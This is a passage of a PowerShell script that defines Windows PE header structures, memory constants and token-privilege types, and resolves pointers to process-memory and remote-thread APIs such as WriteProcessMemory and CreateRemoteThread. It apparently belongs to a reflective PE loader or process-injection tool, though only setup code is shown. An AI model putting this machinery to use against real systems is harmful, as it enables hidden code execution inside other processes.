		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
